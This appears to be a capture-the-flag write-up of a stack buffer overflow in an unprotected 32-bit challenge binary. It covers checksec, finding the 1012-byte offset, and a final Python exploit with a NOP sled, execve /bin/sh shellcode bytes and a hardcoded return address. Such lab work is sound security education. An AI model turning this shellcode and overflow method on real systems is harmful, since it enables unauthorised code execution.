---
title: "Shell Code"
date: 2021-12-02T11:44:31+01:00
tags: ["Binary-Exploit","Writeup"]
draft: false
type: page
---
## Goal of the exercise

Have a shell and print the contents of the flag file.

## Research And Reverse Engineering Test

### See if there are any protections:
I see it with "checksec" command:

<img src="static/shell-checksec.png" width="70%" height="70%" align="center" class="center">
Apparently the program has no protection.

### What the program uses:
I see it with "ltrace" command:
<img src="static/shell-ltrace.png" width="70%" height="70%" align="center" class="center">

I want to know more about "puts" and "read":
<img src="static/shell-puts.png" width="70%" height="70%" align="center" class="center">

<img src="static/shell-read.png" width="70%" height="70%" align="center" class="center">

## Decompiled C code:
main():

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts(
    "  _________.__           .__  .__                   .___      \n"
    " /   _____/|  |__   ____ |  | |  |   ____  ____   __| _/____  \n"
    " \\_____  \\ |  |  \\_/ __ \\|  | |  | _/ ___\\/  _ \\ / __ |/ __ \\ \n"
    " /        \\|   Y  \\  ___/|  |_|  |_\\  \\__(  <_> ) /_/ \\  ___/ \n"
    "/_______  /|___|  /\\___  >____/____/\\___  >____/\\____ |\\___  >\n"
    "        \\/      \\/     \\/               \\/           \\/    \\/ \n"
    "\n"
    "\n");
  prog();
  return 0;
}
```
prog():

```c
int prog()
{
  char v1; // [esp+8h] [ebp-3F0h]


  get_name(&v1);
  return printf("Hello Mr.%s\n", &v1);
}
```
The C code has nothing interesting, so I have to write it myself.

## ACTUAL ANALYSIS AND EXPLOITATION BEGINS HERE

### I need to know if there is space to write a shellcode:

I can see it from the Assembly code to the "prog()" function:

<img src="static/shell-assembly.png" width="70%" height="70%" align="center" class="center">
The stack is assigned 0x3f8 bytes of space for the variables.

```bash
cereal@killer-VirtualBox:~/Desktop/challenge/l0ngl0ng$ ipython
Python 2.7.12 (default, Nov 12 2018, 14:36:49) 
Type "copyright", "credits" or "license" for more information.


IPython 2.4.1 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details.


In [1]: 0x3f8
Out[1]: 1016
```
So 1016 bytes, It's definitely enough space.
### I need to know if I can take control of the return address:
I can make it with a “Cyclic” string:

<img src="static/shell-string.png" width="70%" height="70%" align="center" class="center">

```bash
cereal@killer-VirtualBox:~/Desktop/challenge/shellcode$ cyclic -l 0x6b616164
1012
```
The cyclic query confirms that the return address has been overwritten with part of my string. Exactly after 1012 bytes (or characters).
I can write a small script to test it:
```python
import struct, sys

junk = "B"*1012
jmp_address = struct.pack("<I", 0x41414141)
payload = junk+jmp_address
print(payload)
```
Result:

<img src="static/shell-test.png" width="70%" height="70%" align="center" class="center">
EIP its perfectly overwritten with "41414141". This confirms that there are 1012 bytes first.
### I need to know where I start writing in memory:
With a breakpoint immediately after my input, I can see the memory layout:


<img src="static/shell-memory.png" width="70%" height="70%" align="center" class="center">
Now in know that I start writing in these addresses, one of the first will be fine.
## Final exploit writing
x.py:

```python
import struct, sys

nope = "\x90"*900
nope2 = "\x90"*89
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #23bytes
jmp_address = struct.pack("<I", 0xffffcd60)

payload = nope+shell+nope2+jmp_address
print(payload)
sys.stdout.flush()
```

### Script analysis:

* 900 "nop", to slide the program to the beginning of the shell code
* The shell code
* 90 "nop" between shell code and return address
* The return address

In this way, I first added some code to my liking and later made sure the program jumps in it!
Result:
    
<img src="static/shell-result.png" width="70%" height="70%" align="center" class="center">
